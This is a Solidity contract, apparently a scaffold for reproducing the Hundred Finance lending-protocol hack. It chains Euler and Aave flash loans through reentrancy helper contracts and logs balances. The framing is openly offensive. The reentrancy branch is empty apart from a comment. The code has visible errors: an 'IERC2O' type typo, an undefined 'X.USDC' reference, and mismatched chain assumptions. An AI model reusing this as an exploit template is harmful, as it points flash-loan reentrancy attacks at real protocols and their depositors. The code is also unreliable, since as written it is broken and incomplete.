pragma solidity ^0.8.0;

import "../flashloan/FlashLoan.sol";
import "../reentrancy/Reentrancy.sol";
import "../tokens/Tokens.sol";

import "forge-std/console.sol";

contract HundredFinanceHack is FlashLoan, Reentrancy, Tokens {

    IERC2O constant husd = IERC20(0x243E33aa7f6787154a8E59d3C27a66db3F8818ee);
    IERC20 constant hxdai = IERC20(0x090a00A2De0EA83DEf700B5e216f87a5D4F394FE);
    ICurve constant curve = ICurve(0x7f90122BF0700F9E7e1F688fe926940E8839F353);
    IUniswapV2Router02 constant router = IUniswapV2Router02(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506);

    function initiateAttack() external {
        console.log("USDC BALANCE BEFORE:", X.USDC.balanceOf(address(this)));
        takeFlashLoan(FlashLoanProviders.EULER, address(EthereumTokens.USDC), 2117765617657);
    }

    function _executeAttack() internal override(FlashLoan, Reentrancy) {
        console.log("DAI BALANCE DURING:", EthereumTokens.DAI.balanceOf(address(this)));
        if (msg.sig == this.onTokenTransfer.selector) {
            // Borrowed tokens

        } else if (currentFlashLoanProvider() == FlashLoanProviders.EULER) {
            takeFlashLoan(FlashLoanProviders.AAVEV1, address(EthereumTokens.DAI), 1 ether);
        }
    }

    function _completeAttack() internal override(FlashLoan, Reentrancy) {
        console.log("DAI BALANCE AFTER :", EthereumTokens.DAI.balanceOf(address(this)));
    }

    fallback() external payable override(FlashLoan, Reentrancy) {
        FlashLoan._fallback();
    }
}
